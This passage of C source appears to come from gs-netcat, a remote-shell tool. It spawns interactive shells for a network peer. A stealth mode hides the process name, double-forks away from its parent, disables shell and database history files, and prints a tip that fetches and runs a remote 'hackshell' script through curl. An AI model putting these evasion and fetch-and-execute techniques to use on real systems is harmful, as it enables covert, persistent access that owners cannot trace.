				break;
			*end = 0;
		}
	}

	if ((ptr == NULL) || (ptr >= end))
	{
		// SIGINT to bash to clear command line
		kill(pid, SIGINT);
		return;
	}

	// Get last PID in file and hope that's the foreground process
	ptr = strrchr(buf, ' ');
	if (ptr == NULL)
		ptr = buf;  // Only 1 PID in there

	int child = atoi(ptr);
	if (child <= 0)
	{
		DEBUGF_R("children entry not valid: %s\n", ptr);
		return;
	}

	// Send to process entire process group
	pid_t pgrp = getpgid(child);
	kill(-pgrp, SIGINT);
}


/*
 * Return SHELL_PATH, shell name (/bin/bash , -bash) and prgname (procps)
 */
static const char *
mk_shellname(const char *shell, char *shell_name, ssize_t len, const char **prgname)
{
	char *dfl_shell = NULL;
	const char *ptr;
	struct stat sb;
	if (stat("/bin/bash", &sb) == 0) {
		dfl_shell = "/bin/bash";
	} else if (stat("/usr/bin/bash", &sb) == 0) {
		dfl_shell = "/usr/bin/bash";
	} else if (stat("/usr/local/bin/bash", &sb) == 0) {
		dfl_shell = "/usr/local/bin/bash";
	} else if (stat("/bin/csh", &sb) == 0) {
		dfl_shell = "/bin/csh";
	} else if (stat("/bin/sh", &sb) == 0) {
		dfl_shell = "/bin/sh";
	} else if (stat("./bash", &sb) == 0) {
		dfl_shell = "./bash";
	} else if (stat("./sh", &sb) == 0) {
		dfl_shell = "./sh";
	} else if (stat("/cygdrive/c/WINDOWS/system32/cmd.exe", &sb) == 0)
		dfl_shell = "/cygdrive/c/WINDOWS/system32/cmd.exe";

	if ((shell != NULL) && (shell[0] == '\0'))
		shell = NULL;
		
	// Check if absolute 'shell' exists or name exists in /bin, /usr/bin
	while (shell != NULL)
	{
		ptr = strrchr(shell, '/');
		if (ptr != NULL)
		{
			// /bin/sh, /bin/bash, ./sh, ./bash
			if (stat(shell, &sb) != 0)
				shell = NULL; // SHELL= was set to absolute path but file does not exist
			break;
		}
		// HERE: SHELL= was not an absolute path.

		char buf[32];
		snprintf(buf, sizeof buf, "/bin/%s", shell);
		if (stat(buf, &sb) == 0) {
			shell = strdup(buf);
			break;
		}
		snprintf(buf, sizeof buf, "/usr/bin/%s", shell);
		if (stat(buf, &sb) == 0) {
			shell = strdup(buf);
			break;
		}
		snprintf(buf, sizeof buf, "/usr/local/bin/%s", shell);
		if (stat(buf, &sb) == 0) {
			shell = strdup(buf);
			break;
		}

		shell = NULL;
	}

	// HERE: shell is an absolute path or NULL

	// Check that it's a known shell (bash, fish, zsh, sh, csh, tcsh)
	// but favour bash if exists (is_great_shell == 1).
	// If no default_shell exists on this system then go with what user
	// provided (could be /bin/false :/).
	while (shell != NULL) {
		ptr = strrchr(shell, '/');
		if (ptr == NULL)
			break; // CAN NOT HAPPEN.
		ptr++;

		size_t sz = strlen(ptr);
		while (shell) {
			// Check for known-good shell
			if (sz == 4) {
				if (strcmp(ptr, "bash") == 0)
					break;
				if (strcmp(ptr, "fish") == 0)
					break;
				if (strcmp(ptr, "tcsh") == 0)
					break;
			} else if (sz == 3) {
				if (strcmp(ptr, "zsh") == 0)
					break;
				if (strcmp(ptr, "csh") == 0)
					break;
			}

			// Not a known-good shell.
			// Use default shell (if available). Otherwise shell remains whatever used supplied via SHELL=.
			if (dfl_shell != NULL)
				shell = dfl_shell;
		}
		break;
	}

	if (shell == NULL)
		shell = dfl_shell;

	// BAIL if no shell found at all, not /bin/sh and not even user supplied SHELL=.
	if (shell == NULL)
		return NULL;

	ptr = strrchr(shell, '/');
	if (ptr != NULL)
		ptr++;
	else
		ptr = shell; // CAN NOT HAPPEN.

	*prgname = NULL;

	if (gopt.flags & GSC_FL_IS_STEALTH) {
		struct stat st;
		// Set PRGNAME unless it's a link (BusyBox etc), which relies on the original argv0
		if (lstat(shell, &st) == 0) {
			if (!S_ISLNK(st.st_mode))
				*prgname = gopt.prg_name; // HIDE as prg_name
		}
	}
	
	snprintf(shell_name, len, "-%s", ptr);
	if (*prgname == NULL)
		*prgname = shell_name;

	return shell;
}

/*
 * Create an envp list from existing env. This is a hack for cmd-execution.
 * 'blacklist' contains env-vars which should not be part of the new
 * envp for the shell (such as STY, a screen variable, which we must remove).
 * 'addlist' contains env-vars that should be added _if_ they do not yet
 * exist.
 *
 * If blacklist and addlist contain the same variable then that variable
 * will be replaced with the one from addlist.
 */
// char **
// mk_env(char **blacklist, char **addlist)
// {
// 	char **env;
// 	int total = 0;
// 	int add_total = 0;
// 	int i;
// 	char *end;
// 	int n;

// 	for (i = 0; environ[i] != NULL; i++)
// 		total++;

// 	for (i = 0; addlist[i] != NULL; i++)
// 		add_total++;

// 	// DEBUGF("Number of environment variables: %d (calloc(%d, %zu)\n", total, total + 1, sizeof *env);
// 	env = calloc(total + add_total + 1, sizeof *env);

// 	/* Copy to env unless variable is in blacklist */
// 	int ii = 0;
// 	for (i = 0; i < total; i++)
// 	{
// 		char *s = environ[i];

// 		/* Check if we want this env variable and continue if not */
// 		end = strchr(s, '=');
// 		if (end == NULL)
// 			continue;			// Illegal enviornment variable
// 		/* Check if the env is in the BLACK list */
// 		char **b = blacklist;
// 		for (; *b != NULL; b++)
// 		{
// 			if (end - s > strlen(*b))
// 				continue;
// 			if (memcmp(s, *b, end - s) == 0)
// 				break;			// In the blacklist
// 		}
// 		if (*b != NULL)
// 			continue;			// Skip if in blacklist

// 		env[ii] = strdup(s);
// 		ii++;
// 	}

// 	/* Append to env unless variable is already in env */
// 	int env_len = ii;
// 	int should_add;
// 	for (n = 0; addlist[n] != NULL; n++)
// 	{
// 		char *al_end = strchr(addlist[n], '=');
// 		if (al_end == NULL)
// 			continue;

// 		should_add = 1;
// 		for (i = 0; i < env_len; i++)
// 		{
// 			char *s = env[i];
// 			end = strchr(s, '=');
// 			if (end == NULL)
// 				continue;
// 			if (al_end - addlist[n] != end - s)
// 				continue;
// 			if (memcmp(s, addlist[n], end - s) == 0)
// 			{
// 				should_add = 0;
// 				break;	// Already in this list
// 			}
// 		}
// 		if (should_add != 0)
// 		{
// 			// DEBUGF_C("Adding %s\n", addlist[n]);
// 			env[ii] = strdup(addlist[n]);
// 			ii++;
// 		}

// 	}

// 	return env;
// }

static void
setup_cmd_child(int except_fd)
{
	/* Close all (but 1 end of socketpair) fd's */
	int i;
	for (i = 3; i < MIN(getdtablesize(), FD_SETSIZE); i++)
	{
		if (i == except_fd)
			continue;
		close(i);
	}

	signal(SIGCHLD, SIG_DFL);
	signal(SIGPIPE, SIG_DFL);
}

#ifndef HAVE_OPENPTY
static int
openpty(int *amaster, int *aslave, void *a, void *b, void *c)
{
	int master;
	int slave;

	master = posix_openpt(O_RDWR | O_NOCTTY);
	if (master == -1)
		return -1;

	if (grantpt(master) != 0)
		return -1;
	if (unlockpt(master) != 0)
		return -1;

	slave = open(ptsname(master), O_RDWR | O_NOCTTY);
	if (slave < 0)
		return -1;

# if defined __sun || defined __hpux /* Solaris, HP-UX */
  if (ioctl (slave, I_PUSH, "ptem") < 0
      || ioctl (slave, I_PUSH, "ldterm") < 0
#  if defined __sun
      || ioctl (slave, I_PUSH, "ttcompat") < 0
#  endif
     )
    {
      close (slave);
      return -1;
    }
# endif	

    *amaster = master;
    *aslave = slave;

    return 0;
}
#endif	/* HAVE_OPENPTY */

void
tty_leader(int fd) {
	setsid();
#ifdef TIOCSCTTY
	// Become the controlling terminal
	if (ioctl(fd, TIOCSCTTY, NULL) == 0)
		return;
#endif
	// Try any other way to become controlling terminal
	char *ptr = ttyname(fd);
	if (ptr == NULL)
		return;
	int newfd;
	newfd = open(ptr, O_RDWR); // Becoming a controlling terminal
    close(newfd);
}

// Make the PPID equal to 1 (unlink from process tree) in STEALTH mode
static void
try_doublefork(void) {
	pid_t pid;

	if (!(gopt.flags & GSC_FL_IS_STEALTH))
		return;

	signal(SIGHUP, SIG_IGN);
	pid = fork();
	if (pid > 0) {
		gopt.flags |= GSC_FL_IS_NO_ATEXIT;
		exit(0);
	}
	// HERE: Child
	signal(SIGHUP, SIG_DFL);
}

// Must use my own forkpty() because OpenBSD and FreeBSD <10.x do not
// allow to re-assign controlling terminals that were already assigned
// previously - a feature that's needed for GS_STEALTH to force parent-pid
// to become 1.
static int
myforkpty(int *fd, void *a, void *b, void *c)
{
	pid_t pid;
	int slave;
	int master;

	if (openpty(&master, &slave, NULL, NULL, NULL) == -1)
		return -1;

	pid = fork();
	if (pid < 0)
		return -2;

	if (pid > 0) {
		// PARENT
		close(slave);
		*fd = master;
		return pid;
	}

	/* CHILD */
	close(master);
	try_doublefork();

#ifdef TIOCNOTTY
	// Give up this controlling terminal if we are already controlling
	ioctl(slave, TIOCNOTTY, NULL);
#endif
	tty_leader(slave);
	dup2(slave, 0);
	dup2(slave, 1);
	dup2(slave, 2);
	if (slave > 2)
		close(slave);

	return 0;	// CHILD
}

static pid_t
forkfd(int *fd)
{
	int fds[2];
	int ret;
	pid_t pid;

	ret = socketpair(AF_UNIX, SOCK_STREAM, 0, fds);
	if (ret != 0)
		return -1;

	pid = fork();
	if (pid < 0)
		return pid;

	if (pid > 0) {
		/* HERE: Parent process */
		close(fds[0]);
		*fd = fds[1];

		return pid;
	}

	// CHILD
	try_doublefork();

	// Put this child into its own group.
	// Otherwise keypress 'Ctrl-C' on the server would not
	// send SIGINT to the server but to the forked child() (bash).
	setsid();

	dup2(fds[0], STDOUT_FILENO);
	dup2(fds[0], STDERR_FILENO);
	dup2(fds[0], STDIN_FILENO);
	*fd = fds[0];

	return pid;
}

// Child's process stderr goes to client via TCP. On (some) Cygwin/Windows
// we need to sleep() for the stderr buffer to flush (wtf).
#define SLOWEXIT(a...)	do { \
	fprintf(stderr, "ERROR: "); \
	fprintf(stderr, a); \
	sleep(1); \
	exit(255); \
} while (0)

static int
pty_cmd(GS_CTX *ctx, const char *cmd, pid_t *pidptr, int *err)
{
	pid_t pid;
	int fd = -1;
	int is_nopty = 0;

	*err = 0;
	pid = myforkpty(&fd, NULL, NULL, NULL);
	if (pid < 0) {
		*err = GS_FD_CMD_ERR_NOPTY;
		is_nopty = 1;
		// In restricted environments /dev/ptmx is not available.
		// Drop into a dump shell (without PTY control) and
		// emulate Ctrl-C etc. There will be dragons...
		pid = forkfd(&fd);
		if (pid < 0)
			return -1;
	}
	XASSERT(pid >= 0, "Error: forkpty()=%d: %s\n", pid, strerror(errno));

	if (pid > 0) {
		/* HERE: Parent */

		// *pidptr is used to emulate CTRL-c when TTY allocation fails.
		if (gopt.flags & GSC_FL_IS_STEALTH)
			pid = -1; // pid becomes meaningless when performing double-fork.

		if (pidptr)
			*pidptr = pid;

		return fd; // TTY master
	}

	/* HERE: Child */
	setup_cmd_child(fd /* -1, ignore */);

	signal(SIGINT, SIG_DFL);
	signal(SIGCHLD, SIG_DFL);
	signal(SIGTERM, SIG_DFL);

	char **envp;
	size_t envplen = 0;
	envp = calloc(64, sizeof *envp);

	/* Find out default ENV (just in case they do not exist in current
	 * env-variable such as when started during bootup.
	 * Note: Do not use shell from /etc/passwd as this might be /bin/nologin.
	 * Instead, use the same shell that was used when gs-netcat server got
	 * started.
	 */
	const char *shell = NULL; //"/bin/sh"; // default
	char shell_name[64];	// e.g. -bash
	const char *prg_name;
	shell_name[0] = '\0';
	if (cmd == NULL)
		shell = ctx->gs_shell?:GS_getenv("SHELL");
	shell = mk_shellname(shell, shell_name, sizeof shell_name, &prg_name);
	if (shell == NULL)
		SLOWEXIT("No shell found in /bin or /usr/bin or ./. Try setting SHELL=\n");

	char buf[1024];
	snprintf(buf, sizeof buf, "SHELL=%s", shell);
	envp[envplen++] = strdup(buf);

	char *user = "root";
	char *home_env = "HOME=/root";
	char *home_workdir = ctx->gs_workdir?:GS_GETENV2("WORKDIR"); // GS_WORKDIR is set
	struct passwd *pwd;
	pwd = getpwuid(getuid());
	if (pwd != NULL) {
		user = strdup(pwd->pw_name);
		snprintf(buf, sizeof buf, "HOME=%s", pwd->pw_dir);
		home_env = strdup(buf);
	}
	envp[envplen++] = home_env;
	// if HOME= is not set then assume we were started from systemd
	// and like to change WorkDir to user's ~/ (unelss GS_WORKDIR= is set)
	if (home_workdir == NULL) {
		if ((GS_getenv("HOME") == NULL) && (pwd != NULL))
			home_workdir = pwd->pw_dir;
	}
	if (home_workdir != NULL)
		chdir(home_workdir);

	// Sometimes the user has no home directory or there is no .bashrc.
	// Do the best we can to set a nice prompt and give a hint to the user.
	char *str = "\\[\\033[36m\\]\\u\\[\\033[m\\]@\\[\\033[32m\\]\\h:\\[\\033[33;1m\\]\\w\\[\\033[m\\]\\$ ";
	snprintf(buf, sizeof buf, "PS1=%s", str);
	printf("\
=Tip            : Press "CDM"Ctrl-e c"CN" for elite console\n\
=Tip            : "CDC"PS1='%s'"CN"\n\
", str);
	if (gopt.flags & GSC_FL_IS_STEALTH) {
		printf("\
=Tip            : "CDC"source <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)"CN"\n");
#if 0
		printf("\
=Tip            : "CDC"source <(curl -SsfL https://thc.org/hs)"CN"\n");
#endif
	}
	if (GS_getenv("PS1") == NULL) {
		// Note: This only works for /bin/sh because some bash reset this value.
		envp[envplen++] = strdup(buf);
		envp[envplen++] = "PS2=> ";
	}

	snprintf(buf, sizeof buf, "USER=%s", user);
	envp[envplen++] = strdup(buf);
	snprintf(buf, sizeof buf, "LOGNAME=%s", user);
	envp[envplen++] = strdup(buf);

	if (shell[0] == '.') {
		// Windows without cygwin install executes ./bash or ./sh
		snprintf(buf, sizeof buf, "PATH=%s:%s", getcwdx()?:"/", GS_getenv("PATH")?:"/usr/bin:/bin:/usr/sbin:/sbin");
	} else {
		snprintf(buf, sizeof buf, "PATH=%s", GS_getenv("PATH")?:"/usr/bin:/bin:/usr/sbin:/sbin");
	}
	envp[envplen++] = strdup(buf);

	snprintf(buf, sizeof buf, "MAIL=/var/mail/%.50s", user);
	envp[envplen++] = strdup(buf);

	// Start with a clean environemnt (like OpenSSH does).
	// STY = Confuses screen if gs-netcat is started from within screen (OSX)
	// GSOCKET_ARGS = Otherwise any further gs-netcat command would
	//    execute with same (hidden) commands as the current shell.
	// HISTFILE= does not work on oh-my-zsh (it sets it again)
	// FIXME: See OpenSSH/session.c:
	// 1. Read /etc/default/login
	// 2. Retrieve TZ, TERM, DISPLAY, LANG, LC from client.
	// 3. Add ~/.ssh/environment
	
	envp[envplen++] = "TERM=xterm-256color";
	envp[envplen++] = "HISTFILE=/dev/null";
	envp[envplen++] = "LESSHISTFILE=-";
	envp[envplen++] = "REDISCLI_HISTFILE=/dev/null";
	envp[envplen++] = "MYSQL_HISTFILE=/dev/null";
	envp[envplen++] = "T=\t~$:?";
	// Cant use C.UTF-8 here because it screws up `systemctl status` output
	envp[envplen++] = "LANG=en_US.UTF-8";
	envp[envplen++] = "GS_CONFIG_READ=0";

	char *ptr = gopt.prg_exename;
	if (ptr == NULL) {
		printf("="CDR"WARNING"CN"        : GSNC is not installed permanently (will not survive a reboot)\n");
	} else {
		struct stat sb;
		if (stat(ptr, &sb) != 0) {
			printf("="CDR"WARNING"CN"        : GSNC has been removed: "CDY"%s"CN"\n", ptr);
			ptr = NULL;
		} 
	}
	if (ptr == NULL) {
		char procpidexe[64];
		snprintf(procpidexe, sizeof procpidexe, "/proc/%d/exe", getpid());
		if ((fd = open(procpidexe, O_RDONLY)) >= 0) {
			close(fd);
			ptr = procpidexe;
		}
	}

	if (ptr != NULL) {
		snprintf(buf, sizeof buf, "GSNC=%s", ptr);
		envp[envplen++] = strdup(buf);
	}

	if (cmd != NULL) {
		execle("/bin/sh", cmd, "-c", cmd, NULL, envp);
		SLOWEXIT("exec(%s) failed: %s\n", cmd, strerror(errno));
	} 

	if (is_nopty) {
		const char *args = "-il";	// bash, fish, zsh
		if (strcmp(shell_name, "-sh") == 0)
			args = "-i";	// solaris 10 /bin/sh does not like -l
		if (strcmp(shell_name, "-csh") == 0)
			execle(shell, prg_name, NULL, envp); // csh (fbsd) without any arguments
		execle(shell, prg_name, args, NULL, envp); // No PTY. Need '-il'.
	} else {
		// For PTY Terminals the -il is not needed
		execle(shell, prg_name, NULL, envp);
		fprintf(stderr, "ERROR: execle(%s) failed: %s\n", shell, strerror(errno));
		execlp("/bin/sh", "-sh", NULL);
		fprintf(stderr, "ERROR: execle(/bin/sh) failed: %s\n", strerror(errno));
	}

	fprintf(stderr, "Type 'Ctrl-e c' to start Elite Console.\n");
	while (1)
		sleep(100);

	exit(255); // NOT REACHED
	return -1; // NOT REACHED
}

/*
 * Spawn a cmd and return fd.
 */
int
fd_cmd(GS_CTX *ctx, const char *cmd, pid_t *pidptr, int *err)
{
	pid_t pid;
	int fds[2];
	int ret;

	*err = 0;

	if (gopt.is_interactive)
		return pty_cmd(ctx, cmd, pidptr, err);

	ret = socketpair(AF_UNIX, SOCK_STREAM, 0, fds);
	if (ret != 0)
		ERREXIT("pipe(): %s\n", strerror(errno));	/* FATAL */

	pid = fork();
	if (pid < 0)
		ERREXIT("fork(): %s\n", strerror(errno));	/* FATAL */

	if (pid == 0)
	{
		/* HERE: Child process */
		setup_cmd_child(fds[0]);
		dup2(fds[0], STDOUT_FILENO);
		dup2(fds[0], STDERR_FILENO);
		dup2(fds[0], STDIN_FILENO);
#ifdef __CYGWIN__
		// Cygwin throws "Connection reset by peer" on socketpair when system
		// is under heavy load if we execl() immediately.
		// It appears that perhaps the child executes to quickly. Any pending data
		// on stdout is then lost and the parent gets a read-error on the
		// socketpair-fd (Connection reset by peer). The only work around
		// is to add a 'sleep 0.2' to any executed command. Happens very
		// rarely. It can easily be reproduced by running test 7.1 with these
		// two lines:
		// write(fds[0], "Hello World\n", 12);
		// exit(0);
#endif

		execl("/bin/sh", cmd, "-c", cmd, NULL);
		ERREXIT("exec(%s) failed: %s\n", cmd, strerror(errno));
	}

	/* HERE: Parent process */
	if (pidptr)
		*pidptr = pid;
	close(fds[0]);

	return fds[1];
}

/*
 * Complete the connect() call
 * Return -1 on waiting.
 * Return -2 on fatal.
 */
int
fd_net_connect(GS_SELECT_CTX *ctx, int fd, uint32_t ip, uint16_t port)
{
	struct sockaddr_in addr;
	int ret;

	memset(&addr, 0, sizeof addr);
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = ip;
	addr.sin_port = port;
	ret = connect(fd, (struct sockaddr *)&addr, sizeof addr);
	DEBUGF("connect(%s:%d, fd = %d): %d (errno = %d, %s)\n", int_ntoa(ip), ntohs(port), fd, ret, errno, strerror(errno));
	if (ret != 0)
	{
		if ((errno == EINPROGRESS) || (errno == EAGAIN) || (errno == EINTR))
		{
			XFD_SET(fd, ctx->wfd);
			return -1;
		}
		if (errno != EISCONN)
		{
			DEBUGF_R("ERROR %s\n", strerror(errno));
			// gs_set_error(gsocket->ctx, "connect(%s:%d)", int_ntoa(ip), ntohs(port));
			return -2;
		}
	}
	/* HERRE: ret == 0 or errno == EISCONN (Socket is already connected) */
	DEBUGF_G("connect(fd = %d) SUCCESS (errno = %d)\n", fd, errno);

	return 0;
}

int
fd_net_accept(int listen_fd)
{
	int sox;
	int ret;

	sox = accept(listen_fd, NULL, NULL);
	DEBUGF_B("accept(%d) == %d\n", listen_fd, sox);
	if (sox < 0)
		return -2;

	ret = fcntl(sox, F_SETFL, O_NONBLOCK | fcntl(sox, F_GETFL, 0));
	if (ret != 0)
		return -2;

	return sox;
}

/*
 * Create a listening fd on port.
 */
int
fd_net_listen(int fd, uint16_t *port, int type)
{
	struct sockaddr_in addr;
	int ret;
	int is_random_port = 0;

	if ((port == NULL) || (*port == 0))
		is_random_port = 1;

	setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof (int));

	memset(&addr, 0, sizeof addr);
	addr.sin_family = AF_INET;
	if (is_random_port == 0)
	{
		addr.sin_port = *port;
		addr.sin_addr.s_addr = htonl(INADDR_ANY);
	} else {
		addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	}

	ret = bind(fd, (struct sockaddr *)&addr, sizeof addr);
	if (ret < 0)
		return ret;

	if (is_random_port)
	{
		struct sockaddr_in paddr;
		socklen_t plen = sizeof addr;
		ret = getsockname(fd, (struct sockaddr *)&paddr, &plen);
		*port = paddr.sin_port;
	}

	if (type == SOCK_STREAM)
	{
		// HERE: TCP socket (needs listen()
		ret = listen(fd, 1);
		if (ret != 0)
			return -1;
	}

	return 0;
}

/*
 * Return fd on success.
 * Return < 0 on fata error.
 */
int
fd_new_socket(int type)
{
	int fd;
	int ret;

	fd = socket(PF_INET, type, 0);
	if (fd < 0)
		return -2;
	DEBUGF_W("socket() == %d\n", fd);

	ret = fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
	if (ret != 0)
		return -2;

	return fd;
}

void
fd_kernel_flush(int fd)
{
#ifdef TIOCOUTQ
	int value = 0;
	int i;
	int ret;

	for (i = 0; i < 10; i++)
	{
		if (ioctl(fd, TIOCOUTQ, &value) != 0)
			break;
		if (value == 0)
			break;

		socklen_t len = sizeof (value);
		ret = getsockopt(fd, SOL_SOCKET, SO_ERROR, &value, &len);
		if ((ret != 0) || (value == EPIPE))
			break;

		usleep(10 * 1000);
	}
#endif
}

void
cmd_ping(struct _peer *p)
{
	if (p->is_want_ping != 0)
		return;

	DEBUGF("Sending PING (waiting-for-reply==%d)\n", p->is_want_ping);
	p->is_want_ping = 1;
	GS_SELECT_FD_SET_W(p->gs);
}

void
cmd_pwd(struct _peer *p)
{
	if (gopt.is_want_pwd != 0)
		return;

	gopt.is_want_pwd = 1;
	GS_SELECT_FD_SET_W(p->gs);
}

/*
 * Duplicate the process. Parent to check if child dies by monitoring stdin
 * socketpair to child and parent also monitors its own stdin to
 * check if calling process has died.
 *
 * If child dies then fork again.
 * This function is different to GS_daemonize
 * -> ppid is not 1 (not becoming a daemon).
 * -> not using wait() to check for child's death
 * -> This parent does not become a new session leader (no setsid()).
 *
 * This function is used when gsocket hijacks a process and needs to spawn
 * a gs-netcat process. The gs-netcat process needs to monitor when the calling
 * app exits (and this can only be done by monitoring when its own stdin becomes
 * unavailable).
 *
 * This funciton loops forever and never returns.
 */
void
gs_watchdog(void)
{
	pid_t pid;
	pid_t ppid = 0;
	pid_t ppid_now = 0;
	struct timeval tv;
	struct timeval *tvptr = NULL;

	while (1) // LOOP FOREVER
	{
		int fds[2];
		socketpair(AF_UNIX, SOCK_STREAM, 0, fds);
		pid = fork();
		XASSERT(pid >= 0, "fork(): %s\n", strerror(errno));

		if (pid == 0)
		{
			// CHILD
			close(fds[1]);
			dup2(fds[0], STDIN_FILENO);
			return; // CHILD continues to execute
		}

		// PARENT:
		close(fds[0]);
		ppid = getppid();
		// fdsp[1] is a socket to the child. We can detect when it dies....
		fd_set rfds;

		int n;
		while (1)
		{
			FD_ZERO(&rfds);
			if (tvptr == NULL)
			{
				FD_SET(STDIN_FILENO, &rfds);
			} else {
				// Poll and check ppid has changed
				XASSERT(gopt.is_internal != 0, "tvptr=%p but not internal(=%d)\n", tvptr, gopt.is_internal);
				tv.tv_sec = 5;
				tv.tv_usec = 0;
			}
			FD_SET(fds[1], &rfds);
			n = select(fds[1] + 1, &rfds, NULL, NULL, tvptr /* NULL unless is_internal */);
			if (n < 0)
			{
				if (errno == EINTR)
					continue;
				exit(EX_BADSELECT); // FATAL
			}

			// Detect if the parent dies (e.g. STDIN closes).
			// A special case is 'sshd -d': SSHD closes all 'not needed' FDs
			// (including our IPC). We need a different way to check if
			// parent died in addition to checking if our IPC got closed:
			// Check if ppid has changed as well as IPC closed (parent is really dead).
			if (FD_ISSET(STDIN_FILENO, &rfds))
			{
				ppid_now = getppid();
				DEBUGF_Y("Watchdog: EOF on STDIN. (parent=%d died or closed IPC. ppid_now=%d)?\n", ppid, ppid_now);
				if (gopt.is_internal == 0)
					exit(0); // NOT ./gsocket <app>

				if (ppid_now < ppid)
					exit(0);
				close(STDIN_FILENO);
				tvptr = &tv;
			}
			if (tvptr != NULL)
			{
				// Check if ppid has changed. Exit if it has.
				ppid_now = getppid();
				if (ppid_now < ppid)
				{
					DEBUGF_Y("Watchdog: PPID=%d changed (was %d). Parent is dead(?)\n", ppid_now, ppid);
					exit(0);
				}
			}

			if (FD_ISSET(fds[1], &rfds))
			{
				// Oops. Child died. Restart.
				close(fds[1]);
				sleep(5); // Grace period to prevent exessive restarts...
				break;
			}
			sleep(1); // Grace period (not needed, unless select() goes haywire...)
		}
	}

	// NOT REACHED
}


